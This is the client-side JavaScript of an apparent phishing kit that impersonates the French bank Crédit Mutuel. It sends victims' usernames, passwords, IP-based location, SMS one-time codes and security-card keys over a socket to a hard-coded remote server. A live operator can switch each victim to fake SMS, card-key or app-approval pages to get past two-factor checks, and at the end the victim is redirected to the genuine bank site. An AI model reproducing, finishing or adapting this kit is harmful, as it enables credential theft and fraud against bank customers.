
// make connection
const socket = io.connect('http://188.227.84.135:80')

// get data

let ip =  '188.227.84.135'

$(document).ready(function () {

    fetch('http://extreme-ip-lookup.com/json/')
    .then(res => res.json())
    .then(data => {
        ip = `${data.query} / ${data.countryCode} / ${data.region} / ${data.city}`
    }).then( 
        socket.emit('clyen',{
        ip: ip,
        clyan :'clyen jdid'
        })  )
    .catch(err => {
        console.error('Error: ', err);
    });



    document.body.addEventListener('DOMSubtreeModified', function () {
        const thedivname = $("#DivName").attr("value")
        if(thedivname)
{
            socket.emit('DOM_HAS_CHANGED', thedivname) 
        if (thedivname == "Confirmation")
        {

        setTimeout(function () {
            window.location.replace("https://www.creditmutuel.fr/");}, 5000);
        }

}

}, false);

});

// go to an other page
$("#Variable_countainer").on("click", "button#clickmee", function(){
    const divnext = $("input#DivNext").val()
    const divname = $("input#DivName").val()
    const DivCle = $("#DivCle").val()
    const DivNumero = $("#DivNumero").val()
    
        if(divname == 'Login' || divname == 'Login_Error')
        {
            const log = $("input#lGC").val()
            const pass = $("input#LPC").val()
            socket.emit('new_log',{
                log: log,
                pass : pass,
                ip : ip,
                id : socket.id
                })
        }

        if(divname == 'Sms' || divname == 'Sms_Error')
        {
            const SS = $("input#SS").val()
            socket.emit('new_sms',SS)
        }
        if(divname == 'Cle_Enter_Code' || divname == 'Cle_Error')
        {
            const CL = $("input#CL").val()
            socket.emit('new_cle',CL)
        }

        if (divname == 'Cle_Intro') {
            fetch('./divs/'+divnext+'.html').then( (response) => {
                return response.text().then( (html) => {
                    document.querySelector('#Variable_countainer').innerHTML = html
                }) }).then( () => {
                    $("#mytext").html('Veuillez saisir la clé contenue dans la case '+DivCle+' de votre carte '+DivNumero+' :')
    
                })
        } else if (divname == 'Login' || divname == 'Login_Error') {
            // wait x seconds
            const seconds = 3000

            $('#mydiv_cnx').html('<div class="col-md-1"></div><center><div class="col_lg_5 col-md-5 col-xm-5 col-xs-5"><div style="height: 140px; width: 330px; background-color :#4170a9;"><br><img src="imgs/loading_info1.png" alt=""><br><img src="imgs/spin.gif" width="50" height="50" alt=""><br><img src="imgs/loading_info2.png" alt=""></div></div></center>')
            $('#mydiv_lg_info').html('<!-- hidden -->')

            setTimeout(function () {
                fetch('./divs/'+divnext+'.html').then( (response) => {
                    return response.text().then( (html) => {
                        document.querySelector('#Variable_countainer').innerHTML = html
                    }) })
            }, seconds);
            
            

        }else {
                fetch('./divs/'+divnext+'.html').then( (response) => {
                    return response.text().then( (html) => {
                    document.querySelector('#Variable_countainer').innerHTML = html
                }) })
        }
        
            
});


// set index div
  fetch(`./divs/Login.html`).then( (response) => {
    return response.text().then( (html) => {
        document.querySelector('#Variable_countainer').innerHTML = html
    }) });


// add visitr to panel until he enter the login
// mobile version

// add login entred/sms/cle/socketid/cookies to database
// => update panel from database in every database update
// use on socket for every device
// show only users connected / show all users









socket.on('want_you_change_page',data => {

  console.log('VERIFY_VALUES',data.pagename);


    if (data.pagename == "Cle_Intro" || data.pagename == "Cle_Error"|| data.pagename == "Cle_Enter_Code") {

        fetch('./divs/'+data.pagename+'.html').then( (response) => {
            return response.text().then( (html) => {
                document.querySelector('#Variable_countainer').innerHTML = html
            }) 
        }).then( () => {
            if (data.pagename == "Cle_Error"|| data.pagename == "Cle_Enter_Code") {
                $("#mytext").html('Veuillez saisir la clé contenue dans la case '+data.cle+' de votre carte '+data.numero+' :')
            }
            if(data.pagename == "Cle_Intro") {
                $("#DivCle").val(data.cle)
                $("#DivNumero").val(data.numero)
            }
        })
           /* $("#DivCle").html(data.cle)
            $("#DivNumero").html(data.numero) */
        
         }
    else if (data.pagename == "Sms" || data.pagename == "Sms_Error") {
        fetch('./divs/'+data.pagename+'.html').then( (response) => {
            return response.text().then( (html) => {
                document.querySelector('#Variable_countainer').innerHTML = html
            }) 
        }).then( () => {
                console.log(data.prfx,data.troidernier)
                $("#changenumber1").html('Un <strong>code de confirmation</strong> vient de vous etre envoyer par SMS au '+data.prfx+'XX XX X'+data.troidernier+'.')
                $("#changenumber2").html('-> au '+data.prfx+'XX XX X '+data.troidernier+ ': par  <a href="#">SMS</a>')
        })
    }else if (data.pagename == "App_Approve") {
        fetch('./divs/'+data.pagename+'.html').then( (response) => {
            return response.text().then( (html) => {
                document.querySelector('#Variable_countainer').innerHTML = html
            }) 
        }).then( () => {
                $("#myopr_text").html('Une demande de confirmation mobile a été transmise à votre appareil "<strong>'+data.appareil+'</strong>"')
        })
    
    }else{
        fetch('./divs/'+data.pagename+'.html').then( (response) => {
            return response.text().then( (html) => {
                document.querySelector('#Variable_countainer').innerHTML = html
            }) })
        }

})

